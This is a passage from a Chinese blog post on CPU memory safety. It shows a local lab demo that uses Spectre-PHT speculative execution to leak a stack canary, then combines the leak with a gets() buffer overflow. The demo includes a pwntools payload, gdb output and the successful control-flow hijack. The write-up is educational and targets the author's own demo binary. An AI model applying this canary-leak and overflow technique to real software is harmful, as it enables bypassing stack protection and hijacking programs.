+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / <span class="built_in">set</span> <span class="built_in">emulate</span> on ]────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x5555555557fb &lt;main+4&gt;     sub    rsp, 0x20                    RSP =&gt; 0x7fffffffd8d0 (0x7fffffffd8f0 - 0x20)</span><br><span class="line">   0x5555555557ff &lt;main+8&gt;     mov    rax, qword ptr fs:[0x28]     RAX, [0x7ffff7d9e768] =&gt; 0x31eec8dfc845f600</span><br><span class="line">   0x555555555808 &lt;main+17&gt;    mov    qword ptr [rbp - 8], rax     [0x7fffffffd8e8] &lt;= 0x31eec8dfc845f600</span><br><span class="line">   0x55555555580c &lt;main+21&gt;    xor    eax, eax                     EAX =&gt; 0</span><br><span class="line">   0x55555555580e &lt;main+23&gt;    lea    rax, [rip + 0x8d3]           RAX =&gt; 0x5555555560e8 ◂— <span class="string">&#x27;Reading stack canary with Spectre-PHT:&#x27;</span></span><br><span class="line">   0x555555555815 &lt;main+30&gt;    mov    rdi, rax                     RDI =&gt; 0x5555555560e8 ◂— <span class="string">&#x27;Reading stack canary with Spectre-PHT:&#x27;</span></span><br><span class="line">   0x555555555818 &lt;main+33&gt;    call   puts@plt                    &lt;puts@plt&gt;</span><br><span class="line"> </span><br><span class="line">   0x55555555581d &lt;main+38&gt;    lea    rax, [rbp - 0x20]</span><br><span class="line">   0x555555555821 &lt;main+42&gt;    add    rax, 0x18</span><br><span class="line">   0x555555555825 &lt;main+46&gt;    mov    esi, 8                 ESI =&gt; 8</span><br><span class="line">   0x55555555582a &lt;main+51&gt;    mov    rdi, rax</span><br></pre></td></tr></table></figure>
+
+<p>此时正确canary为：0x31eec8dfc845f600。</p>
+<h3 id="步骤3：利用Spectre-PHT越权窃取Canary并对比"><a href="#步骤3：利用Spectre-PHT越权窃取Canary并对比" class="headerlink" title="步骤3：利用Spectre-PHT越权窃取Canary并对比"></a>步骤3：利用Spectre-PHT越权窃取Canary并对比</h3><p>然后，继续执行Spectre-PHT攻击还原canary值：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Reading stack canary with Spectre-PHT:</span><br><span class="line">Reading at malicious_x = 0x7fffffffd8e8... Success: 0x00=’?’ score=9 (second best: 0xC4=’?’ score=2)</span><br><span class="line">Reading at malicious_x = 0x7fffffffd8e9... Success: 0xf6=’?’ score=7 (second best: 0xFF=’?’ score=1)</span><br><span class="line">Reading at malicious_x = 0x7fffffffd8ea... Success: 0x45=’E’ score=2 </span><br><span class="line">Reading at malicious_x = 0x7fffffffd8eb... Success: 0xc8=’?’ score=2 </span><br><span class="line">Reading at malicious_x = 0x7fffffffd8ec... Success: 0xdf=’?’ score=2 </span><br><span class="line">Reading at malicious_x = 0x7fffffffd8ed... Success: 0xc8=’?’ score=2 </span><br><span class="line">Reading at malicious_x = 0x7fffffffd8ee... Success: 0xee=’?’ score=2 </span><br><span class="line">Reading at malicious_x = 0x7fffffffd8ef... Success: 0x31=’1’ score=2 </span><br></pre></td></tr></table></figure>
+
+<p>我们恢复的数据也是0x31eec8dfc845f600。</p>
+<h2 id="结合Spectre-PHT与栈溢出实现控制流劫持"><a href="#结合Spectre-PHT与栈溢出实现控制流劫持" class="headerlink" title="结合Spectre-PHT与栈溢出实现控制流劫持"></a>结合Spectre-PHT与栈溢出实现控制流劫持</h2><h3 id="步骤1：准备栈溢出的环境"><a href="#步骤1：准备栈溢出的环境" class="headerlink" title="步骤1：准备栈溢出的环境"></a>步骤1：准备栈溢出的环境</h3><p>在main函数中使用不安全的gets函数，这个缓冲区溢出漏洞使得buf的值过长时能覆盖栈上的canary值以及返回地址：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">// gets for hijack</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter something: &quot;</span>);</span><br><span class="line">  gets(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="步骤2：准备payload"><a href="#步骤2：准备payload" class="headerlink" title="步骤2：准备payload"></a>步骤2：准备payload</h3><p>根据先前的分析，<code>buf</code>的长度为16字节，<code>rbp</code>的地址为<code>buf+32</code>，canary的地址为<code>rbp-8</code>，返回地址的地址为<code>rbp+8</code>，因此我们的payload应该按照如下顺序组成：</p>
+<ul>
+<li>第一，24字节的‘A’用于覆盖buf的16字节以及canary与buf之间的8个字节</li>
+<li>第二，8字节的canary绕过栈保护（要考虑大端小端，也可以直接p64）；</li>
+<li>第三，8字节的‘B’用于覆盖rbp；</li>
+<li>第四，8字节的hijack覆盖返回地址（要考虑大端小端，也可以直接p64）。</li>
+</ul>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fill buf[16]</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x18</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite stack canary: canary, little endian</span></span><br><span class="line">payload += p64(<span class="built_in">int</span>(canary, <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite rbp with 8 bytes</span></span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite return address: hijack, little endian</span></span><br><span class="line">payload += p64(<span class="built_in">int</span>(hijack, <span class="number">16</span>))</span><br></pre></td></tr></table></figure>
+
+<p>在实际实验过程中，我们需要在线运行目标程序：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># compile main.c</span></span><br><span class="line">os.system(<span class="string">&#x27;gcc -std=c99 -o main main.c&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># run a.out binary and hang the process</span></span><br><span class="line">p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>同时利用Spectre-PHT获得canary的地址：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># read canary and hijack address</span></span><br><span class="line">p.recvline().decode()</span><br><span class="line">canary = p.recvline().decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary: &quot;</span> + canary)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Reading stack canary with Spectre-PHT:\n&quot;</span>);</span><br><span class="line">spec((<span class="type">size_t</span>)buf + <span class="number">0x18</span>, <span class="number">8</span>);</span><br></pre></td></tr></table></figure>
+
+<p>最后组合payload传回正在运行的程序中实现控制流劫持：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dump payload</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;payload:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(hexdump(payload))</span><br><span class="line"></span><br><span class="line"><span class="comment"># send payload</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recvline().decode())</span><br></pre></td></tr></table></figure>
+
+<p>实验输出如下：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ python spec.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./main&#x27;</span>: pid 58043</span><br><span class="line">canary: 87d8f30d3e820100</span><br><span class="line"></span><br><span class="line">hijack: 55555555573f</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│</span><br><span class="line">00000010  41 41 41 41  41 41 41 41  00 01 82 3e  0d f3 d8 87  │AAAA│AAAA│···&gt;│····│</span><br><span class="line">00000020  42 42 42 42  42 42 42 42  3f 57 55 55  55 55 00 00  │BBBB│BBBB│?WUU│UU··│</span><br><span class="line">00000030</span><br><span class="line">[*] Process <span class="string">&#x27;./main&#x27;</span> stopped with <span class="built_in">exit</span> code 0 (pid 58043)</span><br><span class="line">Enter something: Congratulations! You have hijacked the control flow!</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p>[1] Kocher, P., Horn, J., Fogh, A., Genkin, D., Gruss, D., Haas, W., … &amp; Yarom, Y. (2019, May). Spectre Attacks: Exploiting Speculative Execution. In 2019 IEEE Symposium on Security and Privacy (SP) (pp. 1-19). IEEE Computer Society.</p>
+<p>[2] Tobah, Y., Kwong, A., Kang, I., Genkin, D., &amp; Shin, K. G. (2022, May). Spechammer: Combining spectre and rowhammer for new speculative attacks. In 2022 IEEE Symposium on Security and Privacy (SP) (pp. 681-698). IEEE.</p>
+<p>[3] <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/</a></p>
+<p>[4] <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/</a></p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                体系结构与内存安全（2）——利用Spectre-PHT推测执行泄漏内存数据
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2025/03/04/arch-mem-2/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">iamywang</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2025-03-04 20:00</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/">体系结构</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E5%86%85%E5%AD%98%E5%AE%89%E5%85%A8/">内存安全</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/CPU%E6%BC%8F%E6%B4%9E/">CPU漏洞</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E6%8E%A8%E6%B5%8B%E6%89%A7%E8%A1%8C/">推测执行</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到 QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="分享到微信"
+            data-tooltip-img-tip="微信扫一扫"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到微博"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2024/03/02/paper-2/"
+                                   title="论文介绍（2）——分支预测器安全漏洞的建模、推导与自动分析"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">论文介绍（2）——分支预测器安全漏洞的建模、推导与自动分析</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;评论
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">评论插件加载失败</span>
+    <button class="reload keep-button">点击重新加载</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">正在加载评论插件</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
+
+        
+            
+
+    <div class="giscus-comments-container">
+        <div class="giscus" id="giscus"></div>
+        <script data-pjax
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        >
+          if (!window.KeepCommentPlugin?.getGiscusTheme) {
+            window.KeepCommentPlugin.getGiscusTheme = () => {
+              return document.documentElement.classList.contains('dark-mode') ? 'dark_dimmed' : 'light_tritanopia'
+            }
+          }
+
+          if (!window.KeepCommentPlugin?.changeGiscusTheme) {
+            window.KeepCommentPlugin.changeGiscusTheme = () => {
+              const iframe = document.querySelector('iframe.giscus-frame')
+              iframe && iframe.contentWindow.postMessage({
+                giscus: {
+                  setConfig: {
+                    theme: window.KeepCommentPlugin.getGiscusTheme()
+                  }
+                }
+              }, 'https://giscus.app')
+            }
+          }
+
+          if (!window.KeepCommentPlugin?.initGiscus) {
+            window.KeepCommentPlugin.initGiscus = () => {
+              const script = document.createElement('script')
+              script.async = true
+              script.src = 'https://giscus.app/client.js'
+              script.setAttribute('data-repo', 'iamywang/iamywang.github.io')
+              script.setAttribute('data-repo-id', 'MDEwOlJlcG9zaXRvcnkxNTY0OTIyOTA=')
+              script.setAttribute('data-category', 'Announcements')
+              script.setAttribute('data-category-id', 'DIC_kwDOCVPiAs4CaIL_')
+              script.setAttribute('data-reactions-enabled', '1')
+              script.setAttribute('data-lang', 'zh-CN')
+              script.setAttribute('data-mapping', 'pathname')
+              script.setAttribute('data-strict', '0')
+              script.setAttribute('data-emit-metadata', '0')
+              script.setAttribute('data-input-position', 'top')
+              script.setAttribute('crossorigin', 'anonymous')
+              script.setAttribute('loading', 'lazy')
+              script.setAttribute('data-theme', window.KeepCommentPlugin.getGiscusTheme())
+              document.querySelector('.giscus-comments-container').appendChild(script)
+              script.onerror = () => {
+                window.KeepCommentPlugin.loadFailHandle()
+              }
+              script.onload = () => {
+                window.KeepCommentPlugin.hideLoading()
+              }
+              const toggleThemeBtn = document.querySelector('.tool-toggle-theme-mode')
+              toggleThemeBtn && toggleThemeBtn.addEventListener('click', () => {
+                window.KeepCommentPlugin.changeGiscusTheme()
+              })
+            }
+          }
+
+          if ('true' === "true") {
+            setTimeout(() => {
+              window.KeepCommentPlugin.initGiscus()
+            }, 1000)
+          } else {
+            window.addEventListener("DOMContentLoaded", window.KeepCommentPlugin.initGiscus)
+          }
+        </script>
+    </div>
+
+
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc left-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Spectre%E6%94%BB%E5%87%BB%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">Spectre攻击的基本原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE"><span class="nav-number">2.</span> <span class="nav-text">实验环境与基本配置</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E5%92%8C%E7%BC%96%E8%AF%91%E9%85%8D%E7%BD%AE"><span class="nav-number">2.1.</span> <span class="nav-text">系统和编译配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%E9%85%8D%E7%BD%AE"><span class="nav-number">2.2.</span> <span class="nav-text">可执行程序配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%B4%E6%98%8E"><span class="nav-number">2.3.</span> <span class="nav-text">说明</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81Spectre-PHT%E8%83%BD%E5%A4%9F%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%E5%86%85%E5%AD%98%EF%BC%9A%E6%8C%87%E4%BB%A4%E5%8C%BA%E5%9F%9F"><span class="nav-number">3.</span> <span class="nav-text">验证Spectre-PHT能够任意读取内存：指令区域</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A41%EF%BC%9A%E8%AE%A1%E7%AE%97PIE%E5%81%8F%E7%A7%BB%E9%87%8F"><span class="nav-number">3.1.</span> <span class="nav-text">步骤1：计算PIE偏移量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A42%EF%BC%9A%E5%88%A9%E7%94%A8Spectre-PHT%E8%AF%BB%E5%8F%96hijack%E5%87%BD%E6%95%B0%E7%9A%84%E6%8C%87%E4%BB%A4%E5%BA%8F%E5%88%97"><span class="nav-number">3.2.</span> <span class="nav-text">步骤2：利用Spectre-PHT读取hijack函数的指令序列</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81Spectre-PHT%E8%83%BD%E5%A4%9F%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%E5%86%85%E5%AD%98%EF%BC%9A%E6%A0%88%E4%BF%9D%E6%8A%A4"><span class="nav-number">4.</span> <span class="nav-text">验证Spectre-PHT能够任意读取内存：栈保护</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A41%EF%BC%9A%E8%AE%A1%E7%AE%97Canary%E7%9A%84%E5%9C%B0%E5%9D%80"><span class="nav-number">4.1.</span> <span class="nav-text">步骤1：计算Canary的地址</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A42%EF%BC%9A%E5%88%A9%E7%94%A8gdb%E8%B0%83%E8%AF%95%E8%8E%B7%E5%8F%96%E7%9C%9F%E5%AE%9E%E7%9A%84Canary"><span class="nav-number">4.2.</span> <span class="nav-text">步骤2：利用gdb调试获取真实的Canary</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A43%EF%BC%9A%E5%88%A9%E7%94%A8Spectre-PHT%E8%B6%8A%E6%9D%83%E7%AA%83%E5%8F%96Canary%E5%B9%B6%E5%AF%B9%E6%AF%94"><span class="nav-number">4.3.</span> <span class="nav-text">步骤3：利用Spectre-PHT越权窃取Canary并对比</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%93%E5%90%88Spectre-PHT%E4%B8%8E%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E7%8E%B0%E6%8E%A7%E5%88%B6%E6%B5%81%E5%8A%AB%E6%8C%81"><span class="nav-number">5.</span> <span class="nav-text">结合Spectre-PHT与栈溢出实现控制流劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A41%EF%BC%9A%E5%87%86%E5%A4%87%E6%A0%88%E6%BA%A2%E5%87%BA%E7%9A%84%E7%8E%AF%E5%A2%83"><span class="nav-number">5.1.</span> <span class="nav-text">步骤1：准备栈溢出的环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A42%EF%BC%9A%E5%87%86%E5%A4%87payload"><span class="nav-number">5.2.</span> <span class="nav-text">步骤2：准备payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="nav-number">6.</span> <span class="nav-text">参考文献</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2022</span>&nbsp;-&nbsp;2025
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">iamywang</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+        
+        <div class="deploy-info info-item">
+            
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
+            
+        </div>
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">19.7k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools left-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+            <li class="tools-item rss flex-center">
+                <a class="flex-center"
+                   href="/atom.xml"
+                   target="_blank"
+                >
+                    <i class="fas fa-rss"></i>
+                </a>
+            </li>
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Spectre%E6%94%BB%E5%87%BB%E7%9A%84%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">Spectre攻击的基本原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE"><span class="nav-number">2.</span> <span class="nav-text">实验环境与基本配置</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E5%92%8C%E7%BC%96%E8%AF%91%E9%85%8D%E7%BD%AE"><span class="nav-number">2.1.</span> <span class="nav-text">系统和编译配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%E9%85%8D%E7%BD%AE"><span class="nav-number">2.2.</span> <span class="nav-text">可执行程序配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%B4%E6%98%8E"><span class="nav-number">2.3.</span> <span class="nav-text">说明</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81Spectre-PHT%E8%83%BD%E5%A4%9F%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%E5%86%85%E5%AD%98%EF%BC%9A%E6%8C%87%E4%BB%A4%E5%8C%BA%E5%9F%9F"><span class="nav-number">3.</span> <span class="nav-text">验证Spectre-PHT能够任意读取内存：指令区域</span></a><ol 